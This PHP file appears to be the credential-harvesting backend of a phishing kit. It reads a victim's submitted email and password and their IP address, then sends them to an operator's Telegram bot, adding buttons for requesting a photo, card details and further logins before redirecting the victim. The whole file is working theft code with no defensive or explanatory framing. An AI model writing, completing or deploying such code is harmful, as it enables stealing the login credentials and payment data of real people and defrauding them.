<?php
session_start();
include 'data.php';

// Get the user's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the form data
$email = $_POST['us'];
$password = $_POST['ct'];

// Get session ID from existing session
$sessionId = $_SESSION['user_session_id'] ?? null;

// Create the message to send
$message = "EMAIL PACIFIC-confirm:

Correo electronico: $email\nContraseña/email: $password\nIP: $ip";

// Enviar con botones si hay sesión
if ($sessionId) {
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '� Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
            ],
            [
                ['text' => '�📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                ['text' => '💳 Tarjeta', 'callback_data' => 'tarjeta_' . $sessionId]
            ],
            [
                ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
            ]
        ]
    ];
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'reply_markup' => json_encode($keyboard)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
} else {
    // Fallback sin botón
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message));
}

// Redirect to another page
header('Location: YOUR_REDIRECT_URL');
exit;
?>
